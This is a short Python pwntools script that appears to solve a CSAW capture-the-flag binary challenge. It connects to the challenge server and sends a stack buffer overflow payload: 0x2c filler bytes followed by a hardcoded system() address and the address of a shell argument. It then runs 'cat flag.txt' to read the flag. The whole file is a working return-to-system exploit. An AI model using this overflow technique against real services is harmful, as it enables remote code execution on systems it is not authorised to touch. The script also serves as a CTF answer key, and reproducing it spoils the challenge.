from pwn import *

#Connect and clean
r = remote("misc.chal.csaw.io", 8003)
addr = r.recvline()

#Create string to send
print("Generating Overflow")
bufferSize = 0x2c
xploit = '41'.decode("hex")*bufferSize #'A' to overflow

addr = "080484f9" #system call Adress
addr = addr[6:8] + addr[4:6] + addr[2:4] + addr[0:2] #Reformat
#Append the Return Value overwrite
xploit += addr.decode("hex")

#Adress of correct paramter for shell, append it to be the first arg on stack
addr = "0804861a"
addr = addr[6:8] + addr[4:6] + addr[2:4] + addr[0:2] #Reformat
xploit += addr.decode("hex")

#Send xploit, get flags
r.sendline(xploit)
r.sendline("cat flag.txt")
print(r.recvall())
